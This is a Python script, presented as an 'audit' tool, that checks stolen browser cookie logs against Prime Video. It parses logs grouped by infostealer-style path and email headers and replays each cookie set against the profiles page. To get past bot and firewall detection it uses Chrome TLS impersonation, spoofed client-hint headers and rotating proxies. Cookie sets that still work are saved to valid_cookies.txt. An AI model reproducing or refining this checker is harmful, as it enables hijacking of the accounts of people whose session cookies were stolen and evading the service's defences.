import os
import tempfile
from http.cookiejar import MozillaCookieJar
from fake_useragent import UserAgent

# curl_cffi handles structural TLS/JA3/HTTP2 emulation at the network socket layer
from curl_cffi import requests

# --- AUDIT TARGET CONFIGURATION ---
COOKIE_FILE_PATH = "cookies.txt"        # Input target containing combined segments
TARGET_URL = "https://www.primevideo.com/profiles"
VALIDATION_STRING = 'customerID' 
OUTPUT_SUCCESS_LOG = "valid_cookies.txt" # Verified output log file

# --- BYPASS CONFIGURATION: PROXIES ---
# Enable proxies to prevent IP rate-limiting and location mismatch bans.
# Format: "http://username:password@ip:port" or "http://ip:port"
USE_PROXIES = False 
PROXY_LIST = [
    "http://proxy_user:proxy_pass@proxy_ip:proxy_port",
]

def get_hardened_browser_headers():
    """
    BYPASS ADDITION: Generates fully aligned Chrome v120 User-Agent 
    AND matching Sec-CH (Client Hints) metadata to defeat strict WAF detection.
    """
    # We lock down a specific high-quality signature block to ensure Client Hints align perfectly
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    return {
        "User-Agent": user_agent,
        # Sec-CH Headers: Modern firewalls check these to verify the User-Agent isn't faked
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive"
    }

def normalize_cookie_lines(raw_lines):
    """
    BYPASS ADDITION: Standardizes wild domain configurations.
    Ensures subdomains (.loaded.com vs loaded.com) bind perfectly within Python's cookiejar.
    """
    clean_lines = ["# Netscape HTTP Cookie File\n"]
    for line in raw_lines:
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            domain = parts[0]
            subdomain_flag = parts[1]
            
            # Strict Domain Rule Enforcement Bypass
            if domain.startswith(".") and subdomain_flag.upper() == "FALSE":
                parts[1] = "TRUE"
                
            clean_lines.append("\t".join(parts) + "\n")
    return clean_lines

def test_cookie_block(session_obj, raw_lines, url, validation_str, cluster_index):
    """Validates cookies utilizing secure environment variables and tracking separation."""
    session_obj.cookies.clear()
    clean_data = normalize_cookie_lines(raw_lines)
    
    with tempfile.NamedTemporaryFile(mode="w+", delete=False, encoding="utf-8") as temp_file:
        temp_file.writelines(clean_data)
        temp_file_path = temp_file.name

    try:
        cookie_jar = MozillaCookieJar(temp_file_path)
        cookie_jar.load(ignore_discard=True, ignore_expires=True)
        session_obj.cookies.update(cookie_jar)
        
        # BYPASS ADDITION: Apply a dedicated proxy per cluster execution loop
        if USE_PROXIES and PROXY_LIST:
            proxy_target = PROXY_LIST[cluster_index % len(PROXY_LIST)]
            session_obj.proxies = {"http": proxy_target, "https": proxy_target}
        
        # BYPASS ADDITION: Use strict header maps + prevent automatic execution parsing errors
        # allow_redirects=True allows us to actively read the final destination URL state
        response = session_obj.get(url, headers=get_hardened_browser_headers(), timeout=15, allow_redirects=False)
        
        # BYPASS ADDITION: REDIRECT INTRUSION GATE
        # Intercept the server routing parameters. If shifted to a login/auth layout, token validation fails.
        final_url = response.url.lower()
        if "login" in final_url or "signin" in final_url or "auth" in final_url:
            print(f"    [-] Rejected: Authentication context invalid. Redirected out to Login Portal ({response.url})")
            return False
            
        # Standard Content Verification Check
        if validation_str in response.text:
            print("    [+] Success: Active authentication signature confirmed inside background state framework.")
            return True
        else:
            print("    [-] Rejected: Core layout structural tags missing from payload.")
            return False
            
    except Exception as e:
        print(f"    [!] Network session parsing exception: {e}")
        return False
    finally:
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)

def process_combined_log_file(file_path, session_obj, url, validation_str, output_log):
    """Processes large, combined log sheets by isolating dynamic header groups."""
    if not os.path.exists(file_path):
        print(f"[-] Operational Error: Log file tracking directory '{file_path}' does not exist.")
        return

    current_path_header = "Unknown_Audit_Group"
    current_cookie_lines = []
    total_processed = 0
    valid_count = 0

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            stripped = line.strip()
            if not stripped:
                continue

            if stripped.startswith("C:\\") or "@" in stripped:
                if current_cookie_lines:
                    total_processed += 1
                    print(f"[*] Auditing log cluster {total_processed}...")
                    if test_cookie_block(session_obj, current_cookie_lines, url, validation_str, total_processed):
                        valid_count += 1
                        print("[+] Cluster verified active. Saving configuration parameters to output file...")
                        with open(output_log, "a", encoding="utf-8") as out:
                            out.write(f"\n{current_path_header}\n\n")
                            out.writelines(current_cookie_lines)
                    else:
                        print("[-] Cluster failed session validation checks.")
                
                current_path_header = stripped
                current_cookie_lines = []
                continue

            if len(stripped.split("\t")) >= 7:
                current_cookie_lines.append(line)

        # Process final block sitting in terminal memory buffer
        if current_cookie_lines:
            total_processed += 1
            print(f"[*] Auditing terminal log cluster {total_processed}...")
            if test_cookie_block(session_obj, current_cookie_lines, url, validation_str, total_processed):
                valid_count += 1
                with open(output_log, "a", encoding="utf-8") as out:
                    out.write(f"\n{current_path_header}\n\n")
                    out.writelines(current_cookie_lines)
                print("[+] Cluster verified active. Saved.")
            else:
                print("[-] Cluster failed session validation checks.")

    print(f"\n[*] Run complete: Evaluated {total_processed} clusters. Recorded {valid_count} stable sessions to {output_log}.")

if __name__ == "__main__":
    # Initialize connection pool structure mimicking Chrome v120 networking variables natively
    http_session_pool = requests.Session(impersonate="chrome120")
    print("[*] Persistent Advanced-TLS Audit Connection Pool established.")
    
    process_combined_log_file(
        file_path=COOKIE_FILE_PATH,
        session_obj=http_session_pool,
        url=TARGET_URL,
        validation_str=VALIDATION_STRING,
        output_log=OUTPUT_SUCCESS_LOG
    )
    
    http_session_pool.close()
